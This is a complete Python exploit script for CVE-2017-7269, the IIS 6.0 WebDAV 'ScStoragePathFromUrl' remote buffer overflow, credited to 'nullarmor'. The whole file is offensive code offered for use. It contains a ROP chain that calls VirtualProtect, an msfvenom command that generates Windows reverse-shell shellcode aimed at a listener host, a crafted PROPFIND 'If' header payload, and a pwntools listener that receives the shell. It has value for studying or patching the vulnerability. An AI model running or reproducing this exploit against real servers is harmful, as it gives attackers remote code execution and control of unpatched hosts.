#!/usr/bin/python
# -*- coding:utf-8 -*-

# Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow 
# CVE: 2017-7269
# Exploit author: Zhiniang Peng & Chen Wu 
# https://github.com/rapid7/metasploit-framework/blob/e56aa1a97100edea503f1d5de17c925b1422dc55/modules/exploits/windows/iis/iis_webdav_scstoragepathfromurl.rb
# https://github.com/danigargu/explodingcan
# Python script exploit author: Renan Almeida a.k.a. nullarmor <nullarmor@protonmail.com>

# Some notes:
# This exploit doesn't crash the IIS 6.0 like the metasploit module BUT we got EOF seconds after the reverse shell connection
# I don't know why this behavior. The box doesn't have Powershell to send a second reverse shell to us.

import argparse
import commands
import requests
import struct
import sys
from pwn import *
from struct import pack


def main():
    
    # args
    argparser = argparse.ArgumentParser(description="Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow",
                                        add_help=False)
    main_arg = argparser.add_argument_group("MAIN")

    main_arg.add_argument('-h', '--help',
                          help='Show this help menu',
                          action='store_true')

    main_arg.add_argument('--rhost', type=str,
                            help='IIS 6.0 host', required=True)

    main_arg.add_argument('--lhost', type=str,
                            help='Local host to receive the reverse shell',
                            required=True)

    main_arg.add_argument('--lport', type=str,
                            help='Local port to receive the reverse shell (default: 4444)',
                            default='4444')

    main_arg.add_argument('--burpsuite', action='store_true',
                            help='Enable burpsuite proxy')

    args = argparser.parse_args()

    # arg validation
    if args.help:
        argparser.print_help()
        sys.exit(1)

    # cons
    rhost = args.rhost
    lhost = args.lhost
    lport = args.lport
    burpsuite = args.burpsuite
    
    # proxies
    proxies = { "http": "127.0.0.1:8080" }
    
    p = lambda x : pack("<L", x)
    
    def string_generator(range_):
        letters = string.ascii_letters
        return ''.join(random.choice(letters) for i in range(range_))
        
    
    def encode_utf(string):
        return string.decode("utf-16le").encode('utf-8')
        
        
    def reverse_shell(l):
        
        print(" [*] Spawning the reverse shell...")

        l.sendline("whoami")
        l.interactive()
    
    
    def generate_shellcode():
        
        if ((os.path.exists('/bin/msfvenom') is False) and (os.path.exists('/usr/bin/msfvenom') is False)):
            print(" [*] Please, install the msfvenom in order to generate the shellcode.")
            sys.exit(1)
            
        msf_payload = "msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={}".format(lhost, lport) 
        msf_payload += " -s 2000 BufferRegister=ESI EXITFUNC=process -b \"\\x00\" -f"
        msf_payload += " raw PrependMigrate=true -e x86/unicode_mixed --arch x86 --platform windows"
        
        print(" [*] Generating the shellcode...")
        
        try:
            shellcode = commands.getstatusoutput(msf_payload)[1].split("bytes\n\n")[1]
        except Exception as e:
            print(e)
            print(" [*] Failed to generate the shellcode, try again later.")
            sys.exit(1)
            
        else:
            print(" [*] Shellcode generated with success, size: {} bytes".format(len(shellcode)))
        
        return shellcode
        
    
    # ROP chain from msf module
    def rop_chain():
        
        print(" [*] Crafting the ROP chain table...")
        
        rop = [
          #MSVCRT.dll - all Windows 2003
          0x77bcb06c, # POP ESI # RETN
          0x77bef001, # Write pointer # Garbage
          0x77bb2563, # POP EAX # RETN
          0x77ba1114, # <- *&VirtualProtect()
          0x77bbf244, # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN
          0x41414141, # junk
          0x77bbee22, # XCHG EAX,ESI # ADD BYTE PTR DS:[EAX],AL # RETN
          0x77bc9801, # POP EBP # RETN
          0x77be2265, # ptr to 'push esp #  ret'
          0x77bb2563, # POP EAX # RETN
          0x03C0946F,
          0x77bdd441, # SUB EAX, 03c0940f  (dwSize, 0x500 -> ebx)
          0x77bb48d3, # POP EBX, RET
          0x77bf21e0, # .data
          0x77bbf102, # XCHG EAX,EBX # ADD BYTE PTR DS:[EAX],AL # RETN
          0x77bbfc02, # POP ECX # RETN
          0x77bef001, # W pointer (lpOldProtect) (-> ecx)
          0x77bd8c04, # POP EDI # RETN
          0x77bd8c05, # ROP NOP (-> edi)
          0x77bb2563, # POP EAX # RETN
          0x03c0944f,
          0x77bdd441, # SUB EAX, 03c0940f
          0x77bb8285, # XCHG EAX,EDX # RETN
          0x77bb2563, # POP EAX # RETN
          0x90909090, # nop
          0x77be6591, # PUSHAD # ADD AL,0EF # RETN
        ]
        
        return struct.pack('<26L', *rop)
        
    # Payload generation from msf module    
    def craft_payload():
        print(" [*] Crafting the payload...")
        
        payload = "<http://{}:80/".format(rhost)
        payload += string_generator(114 - 19)
        payload += encode_utf(string_generator(32))
        payload += encode_utf(p(0x02020202))
        payload += encode_utf(p(0x680312c0))
        payload += encode_utf(string_generator(40))
        payload += encode_utf(p(0x680313c0))
        payload += ">"
        payload += " (Not <locktoken:write1>) <http://{}:80/".format(rhost)
        payload += string_generator(114 - 19)
        payload += encode_utf(string_generator(28))
        payload += encode_utf(p(0x680313c0))
        payload += encode_utf(p(0x77bdf38d))
        payload += encode_utf(string_generator(8))
        payload += encode_utf(p(0x680313c0))
        payload += encode_utf(string_generator(16))
        payload += encode_utf(p(0x68016082))
        payload += encode_utf(rop_chain())
        payload += encode_utf("\x54\x5e\x83\xc6")
        payload += encode_utf("\x0a\x41")
        payload += generate_shellcode()
        payload += ">"
        
        return payload
        
    
    def exploit():
        
        headers = {
            "Content-Length": "0",
            "If": craft_payload()
        }
        
        print(" [*] Exploiting the IIS 6.0...")
        
        l = listen(lport)
        
        try:
            if burpsuite:
                r = requests.request('PROPFIND', "http://{}:80/".format(rhost), 
                                                                headers=headers,
                                                                proxies=proxies,
                                                                timeout=5)
        
            else:
                r = requests.request('PROPFIND', "http://{}:80/".format(rhost), 
                                                                headers=headers,
                                                                timeout=5)
                
        except:
            reverse_shell(l)
            
    
    # main
    print(" [>] Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow")
    print(" [*] Python script exploit author: nullarmor")
    
    exploit()
    
    
if __name__ == '__main__':
    main()
        
